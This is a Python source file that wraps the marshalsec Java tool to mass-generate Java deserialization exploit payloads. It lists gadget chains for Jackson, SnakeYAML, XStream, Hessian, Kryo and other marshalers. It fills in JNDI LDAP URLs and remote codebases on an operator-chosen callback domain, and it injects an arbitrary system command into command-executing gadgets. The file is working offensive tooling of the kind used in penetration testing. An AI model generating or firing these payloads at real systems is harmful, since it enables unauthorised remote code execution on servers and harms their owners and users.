import re
import logging
import os
import base64
from .serializer import Serializer

class Marshalsec(Serializer):

    usage = 'No gadget type specified'

    marshalers = {
        'BlazeDSAMF0': ['SpringPropertyPathFactory', 'C3P0WrapperConnPool'],
        'BlazeDSAMF3': ['UnicastRef', 'SpringPropertyPathFactory', 'C3P0WrapperConnPool'],
        'BlazeDSAMFX': ['UnicastRef', 'SpringPropertyPathFactory', 'C3P0WrapperConnPool'],
        'Hessian': ['SpringPartiallyComparableAdvisorHolder', 'SpringAbstractBeanFactoryPointcutAdvisor', 'Rome', 'XBean', 'Resin'],
        'Hessian2': ['SpringPartiallyComparableAdvisorHolder', 'SpringAbstractBeanFactoryPointcutAdvisor', 'Rome', 'XBean', 'Resin'],
        'Burlap': ['SpringPartiallyComparableAdvisorHolder', 'SpringAbstractBeanFactoryPointcutAdvisor', 'Rome', 'XBean', 'Resin'],
        'Castor': [ 'SpringAbstractBeanFactoryPointcutAdvisor', 'C3P0WrapperConnPool'],
        'Jackson': ['UnicastRemoteObject', 'SpringPropertyPathFactory', 'SpringAbstractBeanFactoryPointcutAdvisor', 'C3P0WrapperConnPool', 'C3P0RefDataSource', 'JdbcRowSet', 'Templates'],
        'Java': ['XBean', 'CommonsBeanutils'],
        'JsonIO': ['UnicastRef', 'UnicastRemoteObject', 'Groovy', 'SpringAbstractBeanFactoryPointcutAdvisor', 'Rome', 'XBean', 'Resin', 'LazySearchEnumeration'],
        'JYAML':  ['C3P0WrapperConnPool', 'C3P0RefDataSource', 'JdbcRowSet'],
        'Kryo': ['SpringAbstractBeanFactoryPointcutAdvisor', 'CommonsBeanutils'],
        'KryoAltStrategy': ['Groovy', 'SpringPartiallyComparableAdvisorHolder', 'SpringAbstractBeanFactoryPointcutAdvisor', 'Rome', 'XBean', 'Resin', 'LazySearchEnumeration', 'BindingEnumeration', 'ServiceLoader', 'ImageIO', 'CommonsBeanutils'],
        'Red5AMF0': ['SpringPropertyPathFactory', 'C3P0WrapperConnPool', 'JdbcRowSet'],
        'Red5AMF3': ['SpringPropertyPathFactory', 'C3P0WrapperConnPool', 'JdbcRowSet'],
        'SnakeYAML': ['UnicastRemoteObject', 'SpringPropertyPathFactory', 'SpringAbstractBeanFactoryPointcutAdvisor', 'XBean', 'CommonsConfiguration', 'C3P0WrapperConnPool', 'C3P0RefDataSource', 'JdbcRowSet', 'ScriptEngine', 'ResourceGadget'],
        'XStream': ['SpringPartiallyComparableAdvisorHolder', 'SpringAbstractBeanFactoryPointcutAdvisor', 'Rome', 'XBean', 'Resin', 'CommonsConfiguration', 'LazySearchEnumeration', 'BindingEnumeration', 'ServiceLoader', 'ImageIO', 'CommonsBeanutils'],
        'YAMLBeans': ['C3P0WrapperConnPool']
    }

    marshalersFormats = {
        'BlazeDSAMF0': 'binary',
        'BlazeDSAMF3': 'binary',
        'BlazeDSAMFX': 'xml',
        'Hessian': 'binary',
        'Hessian2': 'binary',
        'Burlap': 'xml',
        'Castor': 'xml',
        'Jackson': 'json',
        'Java': 'binary',
        'JsonIO': 'json',
        'JYAML': 'yaml',
        'Kryo': 'binary',
        'KryoAltStrategy': 'binary',
        'Red5AMF0': 'binary',
        'Red5AMF3': 'binary',
        'SnakeYAML': 'yaml',
        'XStream': 'xml',
        'YAMLBeans': 'yaml',
    }

    payloadFormats = {
        'SpringPropertyPathFactory': "'<jndiUrl>'",
        'C3P0WrapperConnPool': "'<codebase>' '<class>'",
        'UnicastRef': "'<host>' '<port>'",
        'SpringPartiallyComparableAdvisorHolder': "'<jndiUrl>'",
        'SpringAbstractBeanFactoryPointcutAdvisor': "'<jndiUrl>'",
        'Rome': "'<jndiUrl>'",
        'XBean': "'<codebase>' '<classname>'",
        'Resin': "'<codebase>' '<class>'",
        'C3P0RefDataSource': "'<jndiUrl>'",
        'JdbcRowSet': "'<jndiUrl>'",
        'Templates': "'<system_command>'",
        'CommonsBeanutils': "'<jndiUrl>'",
        'UnicastRemoteObject': "'<port>'",
        'Groovy': "'<system_command>'",
        'LazySearchEnumeration': "'<codebase>' '<class>'",
        'BindingEnumeration': "'<codebase>' '<class>'",
        'ServiceLoader': "'<service_codebase>'",
        'ImageIO': "'<system_command>'",
        'CommonsConfiguration': "'<codebase>' '<class>'",
        'ScriptEngine': "'<codebase>'",
        'ResourceGadget': "'<codebase>' '<classname>'",

    }


    def __init__(self, javaPath, jarPath, chainOpts):
        self.javaPath = javaPath
        self.jarPath = jarPath
        self.javaVersion = None
        javaOpts = ""
        bin = f"'{javaPath}' {javaOpts} -cp '{jarPath}'"
        super().__init__(bin, chainOpts)

    def exists(self):
        result = super().exists('marshalsec.Java')
        if not result:
            return False
        logging.debug("Checking java binary version")
        binBackup = self.bin
        self.bin = self.javaPath
        versionOut = self.exec('-version 2>&1').split('\n')
        self.bin = binBackup
        pattern = r"version\s+\"(?P<majorVersion>[0-9]+)\.(?P<minorVersion>[0-9]+)\."
        regex = re.compile(pattern)
        for line in versionOut:
            match = regex.search(line.lower())
            if match:
                majorVersion = int(match.groupdict()['majorVersion'])
                minorVersion = int(match.groupdict()['minorVersion'])
                # Exemple of formats depending on OpenJDK or Java flavor
                # openjdk version "17.0.12" 2024-07-16
                # java version "1.8.0_431"
                self.javaVersion = majorVersion if majorVersion > 1 else minorVersion
                logging.info(f"Detected java version: {self.javaVersion}")
                logging.debug(f"Detailed version: {line}")
                break
        
        if self.javaVersion == None:
            self.javaVersion = 11
            logging.warning("Cannot detect java version, setting default to 11, but blindly...")
            logging.warning("\n".join(versionOut))

        if self.javaVersion > 11:
            logging.warning(f"Java version is not <= 11, version detected: {self.javaVersion}.")
            logging.warning("You might having errors generating payloads.")
            logging.warning("It is recommended to install it and use it with --java-path option or use Docker container")
            logging.debug('\n'.join(versionOut))
        return True


    
    def chains(self):
        chains = []
        for marshaler, gadgets in self.marshalers.items():
            for gadget in gadgets:
                chains.append({
                    'id': f"{marshaler.lower()}-{gadget.lower()}",
                    'name': f"{marshaler}/{gadget}",
                    'description': f"{marshaler}/{gadget}",
                    'marshaler': marshaler,
                    'gadget': gadget,
                    'output': self.marshalersFormats[marshaler],
                })
            
        return chains

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain

        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")

        logging.info(f"Generating payloads...")
        

        # generate payload for each chain
        count = 0
        for chain in chains:

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue

            gadget = chain['gadget']
            marshaler = chain['marshaler']

            format = self.payloadFormats[gadget]

            if ('<jndiUrl>' in format or '<codebase>' in format or '<service_codebase>' in format) and not interact_domain:
                logging.warning(f"[{chain['name']}] Skipping payload with gadget {gadget} because it requires an interact domain")
                continue

            logging.info(f"[{chain['name']}] Generating payload with gadget '{gadget}'")

            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
            escaped_chain_system_command = chain_system_command.replace("'", "\\'")

            chainArguments = format
            chainArguments = chainArguments.replace('<system_command>', escaped_chain_system_command)
            chainArguments = chainArguments.replace('<class>', f"{marshaler}{gadget}")
            chainArguments = chainArguments.replace('<classname>', f"{marshaler}{gadget}")
            chainArguments = chainArguments.replace('<jndiUrl>', f"ldap://{chain['id']}.{interact_domain}/{marshaler}{gadget}")
            chainArguments = chainArguments.replace('<codebase>', f"https://{chain['id']}.{interact_domain}/")
            chainArguments = chainArguments.replace('<service_codebase>', f"https://{chain['id']}.{interact_domain}/{marshaler}{gadget}")
            chainArguments = chainArguments.replace('<host>', f"{chain['id']}.{interact_domain}")
            chainArguments = chainArguments.replace('<port>', '443')

            chainArguments = f"{gadget} {chainArguments}"
            result = self.payload("marshalsec."+marshaler, chainArguments)
                
            if result.returncode != 0 or result.stdout.strip() == b'':
                logging.error(f"[{chain['name']}] Failed to create payload")
                if result.stdout != b'':
                    logging.error(result.stdout.decode('ascii'))
                    pass
                logging.error(result.stderr.decode('ascii'))
                continue

            payload = result.stdout

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            # binary output can be encoded
            if chain['output'] != 'binary':
                # clean string style formatters to have 1 payload per line
                if not self.chainOpts.one_file_per_payload:
                    payload = payload.decode('utf-8').replace('\r', '').replace('\n', '').encode('utf-8')
            
            self.output(chain['id'], payload+b"\n")
            count = count + 1
            
        return count
